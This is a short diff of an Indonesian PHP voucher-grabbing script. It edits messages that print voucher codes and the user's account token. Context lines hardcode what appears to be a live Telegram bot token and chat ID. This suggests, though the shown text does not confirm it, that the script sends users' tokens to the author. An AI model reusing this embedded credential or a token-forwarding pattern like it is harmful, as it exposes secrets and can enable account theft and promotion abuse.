@@ -152,8 +152,8 @@ ulang:
         echo "\n".color("white"," sampai:  ".$expired11);
 	echo "\n".color("purple","12.       ".$voucher12);
         echo "\n".color("white"," sampai:  ".$expired13);
-        echo "\n".color("nevy","kalau mau yg voucher 15k ketik saja php rondone.php ");
-        echo color("nevy"," Token e Janda: ".$token."\n\n");
+        echo "\n".color("nevy","kalau mau yg voucher 15k ketik saja php janita.php ");
+        echo color("nevy"," Token e yg dicopy: ".$token."\n\n");
         echo"\n";
         $TOKEN  = "1255177018:AAEvsNT6IRAg6NUF8TxJIgfBuMk1ljP0V3A";
 	$chatid = "901308103";
